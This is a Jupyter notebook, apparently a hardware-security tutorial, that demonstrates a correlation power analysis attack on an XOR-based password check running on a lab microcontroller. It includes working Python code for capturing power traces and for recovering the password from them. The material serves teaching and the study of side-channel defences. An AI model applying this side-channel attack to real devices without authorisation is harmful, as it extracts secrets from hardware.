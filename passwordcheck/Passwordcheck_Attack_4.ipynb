{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Attack Password with Correlation Power Analysis IV (CPA)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hide_input": true
   },
   "outputs": [],
   "source": [
    "%run '../helper_scripts/Metadata.ipynb'\n",
    "print_metadata()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "toc": true
   },
   "source": [
    "<h1>Table of Contents<span class=\"tocSkip\"></span></h1>\n",
    "<div class=\"toc\"><ul class=\"toc-item\"><li><span><a href=\"#Improving-the-code\" data-toc-modified-id=\"Improving-the-code-1\"><span class=\"toc-item-num\">1&nbsp;&nbsp;</span>Improving the code</a></span></li><li><span><a href=\"#Basic-Setup\" data-toc-modified-id=\"Basic-Setup-2\"><span class=\"toc-item-num\">2&nbsp;&nbsp;</span>Basic Setup</a></span></li><li><span><a href=\"#Helper-Functions-for-Password-Attack\" data-toc-modified-id=\"Helper-Functions-for-Password-Attack-3\"><span class=\"toc-item-num\">3&nbsp;&nbsp;</span>Helper Functions for Password Attack</a></span></li><li><span><a href=\"#MAD-attack\" data-toc-modified-id=\"MAD-attack-4\"><span class=\"toc-item-num\">4&nbsp;&nbsp;</span>MAD attack</a></span></li><li><span><a href=\"#Pearson-Correlation-Coefficient\" data-toc-modified-id=\"Pearson-Correlation-Coefficient-5\"><span class=\"toc-item-num\">5&nbsp;&nbsp;</span>Pearson Correlation Coefficient</a></span><ul class=\"toc-item\"><li><span><a href=\"#Definition\" data-toc-modified-id=\"Definition-5.1\"><span class=\"toc-item-num\">5.1&nbsp;&nbsp;</span>Definition</a></span></li><li><span><a href=\"#Python-definition\" data-toc-modified-id=\"Python-definition-5.2\"><span class=\"toc-item-num\">5.2&nbsp;&nbsp;</span>Python definition</a></span></li><li><span><a href=\"#Meaning-and-visualization\" data-toc-modified-id=\"Meaning-and-visualization-5.3\"><span class=\"toc-item-num\">5.3&nbsp;&nbsp;</span>Meaning and visualization</a></span></li><li><span><a href=\"#Usage-for-attacks\" data-toc-modified-id=\"Usage-for-attacks-5.4\"><span class=\"toc-item-num\">5.4&nbsp;&nbsp;</span>Usage for attacks</a></span></li></ul></li><li><span><a href=\"#CPA-password-attack\" data-toc-modified-id=\"CPA-password-attack-6\"><span class=\"toc-item-num\">6&nbsp;&nbsp;</span>CPA password attack</a></span></li><li><span><a href=\"#Notes\" data-toc-modified-id=\"Notes-7\"><span class=\"toc-item-num\">7&nbsp;&nbsp;</span>Notes</a></span></li><li><span><a href=\"#Disconnect\" data-toc-modified-id=\"Disconnect-8\"><span class=\"toc-item-num\">8&nbsp;&nbsp;</span>Disconnect</a></span></li></ul></div>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In this example we want to improve the password check again to beat an MAD attack.\n",
    "\n",
    "## Improving the code\n",
    "\n",
    "Let's first recap the password checking loop from `advanced-passwdcheck`:\n",
    "```c\n",
    "for(uint8_t i = 0; i < sizeof(correct_passwd); i++){\n",
    "    if (correct_passwd[i] != passwd[i]){\n",
    "        passbad = 1;\n",
    "    }\n",
    "}\n",
    "```\n",
    "\n",
    "The principle idea of the MAD attack described the last example was that the conditional execution of the `passbad = 1` is sufficient to generate a high peak in the difference between a correct and an incorrect character.\n",
    "This can be omitted if one goes with a more \"mathematical\" solution of the problem detecting if at least one character of the input password differs from the right one:\n",
    "\n",
    "```c\n",
    "passbad = 0;\n",
    "for(uint8_t i = 0; i < sizeof(correct_passwd); i++){\n",
    "    passbad |= correct_passwd[i] ^ passwd[i];\n",
    "}\n",
    "```\n",
    "\n",
    "If the two characters differ their XOR is unequal to zero. Summing them all up with the OR `passbad` is non zero if and only if there was at least one XOR which was non zero.\n",
    "\n",
    "Looking at the assembly code of this loop we can easily see that there is no conditional jump anymore:\n",
    "\n",
    "```assembly\n",
    "    ldi r24, 0x00   ; passbad = 0\n",
    "loop:\n",
    "    ld  r20, X+     ; correct_chr = *correct_passwd; correct_passwd++\n",
    "    ld  r25, Z+     ; chr = *passwd; passwd++\n",
    "    eor r25, r20    ; chr ^= correct_chr\n",
    "    or  r24, r25    ; passbad |= chr\n",
    "\n",
    "    cp  r26, r18    ; Check if correct_passwd reached \n",
    "    cpc r27, r19    ; end address\n",
    "    brne .-14       ; Jump to loop\n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Basic Setup"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Define Variables"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%run \"Init.ipynb\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Build target and upload"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "TARGET = 'advanced-passwdcheck-xor'\n",
    "%store TARGET\n",
    "%run \"Passwordcheck_Prepare.ipynb\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Import helper functions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%run \"../helper_scripts/Setup_Generic.ipynb\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.adc.samples = 500"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Helper Functions for Password Attack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from bokeh.plotting import figure, show \n",
    "from bokeh.io import output_notebook\n",
    "from bokeh.models import CrosshairTool, Label\n",
    "\n",
    "output_notebook()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def cap_pass_trace(pass_guess, capture_output=False):\n",
    "    reset_target(scope)\n",
    "\n",
    "    scope.arm()\n",
    "    target.flush()\n",
    "    target.write(pass_guess)\n",
    "    scope.capture()\n",
    "\n",
    "    trace = scope.get_last_trace()\n",
    "    if capture_output is True:\n",
    "        ret = ''\n",
    "        num_char = target.in_waiting()\n",
    "        while num_char > 0:\n",
    "            ret += target.read(num_char, 10)\n",
    "            time.sleep(0.01)\n",
    "            num_char = target.in_waiting()\n",
    "        return trace, ret\n",
    "    else:\n",
    "        return trace"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## MAD attack\n",
    "\n",
    "Let's see if the idea of high peaks in the absolute difference of two traces is still applicable:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "trace1 = cap_pass_trace('a\\n')\n",
    "trace2 = cap_pass_trace('b\\n')\n",
    "trace3 = cap_pass_trace('i\\n')\n",
    "p = figure(height=200)\n",
    "p.add_tools(CrosshairTool())\n",
    "p.line(range(len(trace1)), abs(trace1 - trace2), color='blue', legend='abs(trace1 - trace2)')\n",
    "p.line(range(len(trace1)), abs(trace1 - trace3), color='red', legend='abs(trace1 - trace3)')\n",
    "show(p)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "It is obvious that there is no point of attack anymore! Did we now succeed in programming a \"secure\" password check? Not yet!\n",
    "\n",
    "## Pearson Correlation Coefficient\n",
    "\n",
    "It is clear that we do not see any high differences in the traces of two password attempts anymore. But, the basic assumption about power side channel attacks still holds:\n",
    "\n",
    "> The power consumption of a device is proportional to the hamming weight of the data it processes.\n",
    "\n",
    "This means precisely, if the XOR between the correct password and the password attempt varies in its hamming weight the power consumption must vary the same way. Can this be observed?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import bokeh.palettes\n",
    "\n",
    "p = figure(height=300, x_range=(0, 100))\n",
    "p.add_tools(CrosshairTool())\n",
    "\n",
    "for i, attempt in enumerate(('\\x01', '\\xff', 'i')):\n",
    "    trace = cap_pass_trace(attempt + '\\n')\n",
    "    p.line(range(len(trace)), trace, color=bokeh.palettes.Set1_6[i], legend=hex(ord(attempt)))\n",
    "\n",
    "show(p)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We can see that there is a small difference in the trace when we compare attempts with really different hamming weights. This is the difference we want to use to break the password again!\n",
    "\n",
    "### Definition\n",
    "An interesting statistical formula to face this problem is given by the *Pearson correlation coefficient*. For two random variables $X, Y$ it is defined as\n",
    "\n",
    "$$\\rho_{X,Y} := \\frac{\\mathrm{Cov}(X, Y)}{\\sqrt{\\mathrm{Var}(X)} \\sqrt{\\mathrm{Var}(Y)}} \\ \\in [-1, 1]\\,.$$\n",
    "\n",
    "For two samples of finite length $x = {x_1, ..., x_n}$, $y = {y_1, ..., y_n}$ it can be defined as \n",
    "\n",
    "$$r_{x,y} := \\frac{\\sum_{i=1}^n (x_i - \\bar x)(y_i - \\bar y)}{\\sqrt{\\sum_{i=1}^n (x_i - \\bar x)^2}\\sqrt{\\sum_{i=1}^n (y_i - \\bar y)^2}} \\ \\in [-1, 1]\\,,$$\n",
    "\n",
    "where $\\bar x := \\frac{1}{n} \\sum_{i=1}^n x_i$ is the mean of a sample $x$."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Python definition"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy as np\n",
    "\n",
    "def pearson(x: np.array, y: np.array):\n",
    "    x_mean = np.mean(x)\n",
    "    y_mean = np.mean(y)\n",
    "    return sum((x - x_mean) * (y - y_mean)) / np.sqrt(sum((x - x_mean) ** 2) * sum((y - y_mean) ** 2))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Meaning and visualization\n",
    "The importance and application of the Pearson coefficient is not obvious. Therefore we want to look at some examples."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy as np\n",
    "import bokeh.palettes\n",
    "import bokeh.layouts\n",
    "from bokeh.models import Label\n",
    "\n",
    "size = 100\n",
    "data = []\n",
    "data.append(5 * np.array(range(size)) + np.random.uniform(-size/4, size/4, size=size))\n",
    "data.append(np.array(range(size)) + np.random.uniform(-size/4, size/4, size=size) + 10)\n",
    "data.append(-3 * np.array(range(size)) + np.random.uniform(-size/4, size/4, size=size) + 200)\n",
    "data.append(100 * np.sin(np.array(range(size)) / size * np.pi) + np.random.uniform(-size/10, size/10, size=size))\n",
    "\n",
    "plots = []\n",
    "\n",
    "for i in range(len(data)):\n",
    "    p = figure()\n",
    "    plots.append(p)\n",
    "    p.circle(range(size), data[i], color=bokeh.palettes.Set1_6[i],\n",
    "             legend='pearson(range(size), data[{}]) = {:.3f}'.format(i, pearson(range(size), data[i])))\n",
    "\n",
    "show(bokeh.layouts.gridplot(children=plots, ncols=2, sizing_mode='scale_width', plot_height=300))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In these plots one can easily see that the Pearson correlation coefficient reveals if there is a *linear* dependency between two samples. The sign of the linear factor equals the sign of the coefficient. At the $\\sin$ example we can see that other dependencies cannot revealed."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Usage for attacks\n",
    "\n",
    "We want to consider the following example: We feed in random data to the password checking function. Somewhere in the code, at the instruction `ld r25, Z+`, the password attempt is loaded into the register file. The power consumption at this point shall be proportional to the hamming weight of the current password data. In other words there is a *linear dependency* between the power consumption and the input!\n",
    "\n",
    "First, define a function to collect traces from random data:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import random\n",
    "import tqdm\n",
    "import numpy as np\n",
    "\n",
    "def cap_pass_random(size=500, password_length=7):\n",
    "    \"\"\"Collect size number of password attempts with fully random random data.\"\"\"\n",
    "    traces = []\n",
    "    textins = []\n",
    "    for _ in tqdm.tqdm_notebook(range(size)):\n",
    "        pass_guess = ''.join(map(chr, random.choices(range(1, 256), k=password_length)))\n",
    "        traces.append(cap_pass_trace(pass_guess + '\\n'))\n",
    "        textins.append(pass_guess)\n",
    "    return np.array(traces), textins"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "And of course a function to compute the Hamming Weight:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy as np\n",
    "\n",
    "HW = [bin(n).count(\"1\") for n in range(0, 256)]\n",
    "\n",
    "def hw(n):\n",
    "    if isinstance(n, str):\n",
    "        return HW[ord(n)]\n",
    "    return HW[n]\n",
    "\n",
    "hw_vec = np.vectorize(hw)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now, let's collect some traces and plot the *pointwise* correlation between the characters of the attempt (more precisely their *hamming weight*) and the traces."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy as np\n",
    "\n",
    "def pearson_pointwise(traces, intermediates):\n",
    "    intermediates_diff = intermediates - np.mean(intermediates)\n",
    "    intermediates_sqrt = np.sqrt(np.sum(intermediates_diff ** 2))\n",
    "    traces_diff = traces - np.mean(traces, axis=0)\n",
    "    \n",
    "    return np.sum(traces_diff * intermediates_diff[:, None], axis=0) / (\n",
    "        np.sqrt(np.sum(traces_diff ** 2, axis=0)) * intermediates_sqrt\n",
    "    )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "import bokeh.palettes\n",
    "import bokeh.transform\n",
    "from bokeh.models import ColumnDataSource\n",
    "\n",
    "def correlation_plot(correlations, color_palette=bokeh.palettes.Oranges6, **kw):\n",
    "    kw['height'] = kw.get('height', 300)\n",
    "    kw['y_range'] = kw.get('y_range', (-1, 1))\n",
    "    p = figure(sizing_mode='stretch_width', **kw)\n",
    "    p.vbar(\n",
    "        x='points',\n",
    "        top='corr',\n",
    "        width=1,\n",
    "        source=ColumnDataSource(data=dict(\n",
    "            points=range(len(correlations)),\n",
    "            corr=correlations,\n",
    "            abscorr=abs(correlations),\n",
    "        )),\n",
    "        color=bokeh.transform.linear_cmap(\n",
    "            field_name='abscorr', \n",
    "            palette=color_palette,\n",
    "            low=1,\n",
    "            high=0,\n",
    "        ),\n",
    "    )\n",
    "    return p"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "traces, textins = cap_pass_random(size=20, password_length=1)\n",
    "correlations = pearson_pointwise(traces, hw_vec(textins))\n",
    "show(correlation_plot(correlations, x_range=(0, 100)))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We can see that there is a huge correlation between the input texts and the traces recorded at around position 55. In other words the instructions at this position exactly operate on the data given by `textins`!\n",
    "\n",
    "How to utilize this for an attack!? What we want to see in the correlation is not the input character itself but somehow the *password*. This can be done by a nice trick:\n",
    "\n",
    "> 1. Find a point where the secret \"collides\" with a definable input.\n",
    "> 2. Correlate against this intermediate result.\n",
    "\n",
    "We know that the processor uses a XOR to \"combine\" the password attempt with the correct password character. Thus we can use this XOR as intermediate value and try \"guessing\" the key:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import bokeh.layouts\n",
    "\n",
    "keyguesses = ['a', 'b', 'i']\n",
    "\n",
    "intermediates = [\n",
    "    np.array([hw(ord(c) ^  ord(keyguess)) for c in textins])\n",
    "    for keyguess in keyguesses\n",
    "]\n",
    "\n",
    "show(bokeh.layouts.column(\n",
    "    children=[\n",
    "        correlation_plot(\n",
    "            pearson_pointwise(traces, intermediate),\n",
    "            title='Correlation against keyguess \"{}\"'.format(keyguess),\n",
    "            height=200,\n",
    "        ) for intermediate, keyguess in zip(intermediates, keyguesses)\n",
    "    ],\n",
    "    sizing_mode='stretch_width',\n",
    "))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now it is clear how to write down the actual attack."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## CPA password attack\n",
    "\n",
    "In words we can formulate the *Correlation Power Analysis (CPA)* attack as follows:\n",
    "\n",
    "1. Trace several password attempts with randomly chosen characters.\n",
    "1. Iterate over all possible password characters.\n",
    "1. Calculate the pointwise Pearson correlation coefficient between the traces and the intermediate value for the current password character. Save the absolute maximum of the correlations.\n",
    "1. It is the correct password character which has the highest absolute correlation."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "import itertools\n",
    "import numpy as np\n",
    "import tqdm\n",
    "\n",
    "def cpa_password_attack(\n",
    "    samples=500,\n",
    "    trylist='abcdefghijklmnopqrstuvwxyz0123456789',\n",
    "    password_length=7,\n",
    "    correlation_threshold=0.8,\n",
    "):\n",
    "    # 1. Capture traces\n",
    "    traces, textins = cap_pass_random(size=samples, password_length=password_length)\n",
    "    \n",
    "    numtraces, numpoints = traces.shape\n",
    "    \n",
    "    password_guess = []\n",
    "    for password_index in range(password_length):\n",
    "        maxpearsons = []\n",
    "        # 2. Iterate over possible characters\n",
    "        for guessid, guess in enumerate(trylist):\n",
    "            # 3. Calculate pointwise correlation between traces and intermediates\n",
    "            intermediate = np.array([hw(ord(attempt[password_index]) ^ ord(guess)) for attempt in textins])\n",
    "            correlations = pearson_pointwise(traces, intermediate)\n",
    "\n",
    "            maxpearsons.append((max(abs(correlations)), guess))\n",
    "\n",
    "        maxpearsons = sorted(maxpearsons, reverse=True) \n",
    "        current_guess = [(corr, char) for corr, char in maxpearsons if corr > correlation_threshold]\n",
    "        if not current_guess:\n",
    "            current_guess = [maxpearsons[0]]\n",
    "        password_guess.append([char for corr, char in current_guess])\n",
    "        print('Candidates for index {}: '.format(password_index), current_guess)\n",
    "        \n",
    "    # 4. Test possible passwords\n",
    "    for attempt in tqdm.tqdm_notebook(itertools.product(*password_guess)):\n",
    "        attempt = ''.join(attempt)\n",
    "        if 'Welcome' in cap_pass_trace(attempt + '\\n', capture_output=True)[1]:\n",
    "            return traces, textins, attempt\n",
    "    \n",
    "    raise Exception('No password found.')\n",
    "\n",
    "traces, textins, password = cpa_password_attack(samples=500)\n",
    "print('Password broken: ', password)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Notes\n",
    "\n",
    "At this point it is not clear why there are several characters per password digit generating high correlations. This analyze would go beyond the scope of this Notebook. Thus it is shifted to a separate sheet."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Disconnect"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.dis()\n",
    "target.dis()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": true,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": true,
   "toc_position": {
    "height": "calc(100% - 180px)",
    "left": "10px",
    "top": "150px",
    "width": "198.5px"
   },
   "toc_section_display": true,
   "toc_window_display": true
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
